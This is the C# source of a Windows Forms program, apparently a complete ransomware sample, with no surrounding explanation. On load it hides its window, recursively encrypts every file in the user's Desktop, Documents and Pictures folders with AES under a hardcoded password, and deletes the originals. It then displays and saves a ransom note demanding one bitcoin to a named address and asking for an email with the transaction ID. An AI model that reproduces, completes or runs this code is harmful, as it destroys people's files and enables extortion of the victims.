using System;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace Ransomware
{
    public partial class Form1 : Form
    {

        private const string extensionEncriptado = ".jcrypt";
        private const string passEncriptado = "Password1";
        private const string direccionBtc = "1BtUL5dhVXHwKLqSdhjyjK9Pe64Vc6CEH1";
        private const string cantidadBtc = "1";
        private const string direccionEmail = "ev1lv3ethov3n@gmail.com";

        private static string logEncriptado = "";
        private string mensajeRansom =
           "All of your files have been encrypted.\n\n" +
           "To unlock them, you must send " + cantidadBtc + " bitcoin to BTC address: " + direccionBtc + "\n" +
           "Afterwards, before my patience runs out, email your transaction ID to: " + direccionEmail + "\n\n" +
           "What a nice day, isn't it?\n\n" +
           "Encryption Log:\n" +
           "----------------------------------------\n";
        private string folderEscritorio = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        private string folderDocumentos = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        private string folderImg = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        private static int totalArchivosEncriptados = 0;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            initializeForm();

                EncriptarContenidoFolder(folderEscritorio);
                EncriptarContenidoFolder(folderImg);
                EncriptarContenidoFolder(folderDocumentos);

            if (totalArchivosEncriptados > 0)
            {
                formatoPostEncriptado();
                escribirMensajeRansom();
            }
            else
            {
                Console.Out.WriteLine("No files to encrypt.");
                Application.Exit();
            }
        }

        private void escribirMensajeRansom()
        {
            StreamWriter ransomWriter = new StreamWriter(folderEscritorio + @"\___RECOVER__FILES__" + extensionEncriptado + ".txt");
            ransomWriter.WriteLine(mensajeRansom);
            ransomWriter.WriteLine(logEncriptado);
            ransomWriter.Close();
        }

        private void formatoPostEncriptado()
        {
            this.Opacity = 100;
            this.WindowState = FormWindowState.Maximized;
            lblCount.Text = totalArchivosEncriptados + " of your files have been encrypted!";
        }

        private void initializeForm()
        {
            this.Opacity = 0;
            this.ShowInTaskbar = false;
            lblBitcoinAmount.Text = "Send " + cantidadBtc + " Bitcoin to the following BTC address:";
            txtBitcoinAddress.Text = direccionBtc;
            txtEmailAddress.Text = direccionEmail;
            lblBitcoinAmount.Focus();
        }

        static void EncriptarContenidoFolder(string sDir)
        {
            try
            {
                foreach (string f in Directory.GetFiles(sDir))
                {
                    if (!f.Contains(extensionEncriptado)) {
                        Console.Out.WriteLine("Encrypting: " + f);
                        FileEncrypt(f, passEncriptado);
                    }
                }

                foreach (string d in Directory.GetDirectories(sDir))
                {
                    EncriptarContenidoFolder(d);
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }

        private static void FileEncrypt(string inputFile, string password)
        {
            byte[] salt = GenerateRandomSalt();

            FileStream fsCrypt = new FileStream(inputFile + extensionEncriptado, FileMode.Create);
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            AES.Mode = CipherMode.CBC;

            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cs.Write(buffer, 0, read);
                }

                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                logEncriptado += inputFile + "\n";
                totalArchivosEncriptados++;
                cs.Close();
                fsCrypt.Close();

                File.Delete(inputFile);
            }
        }

        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(data);
                }
            }

            return data;
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }
    }
}
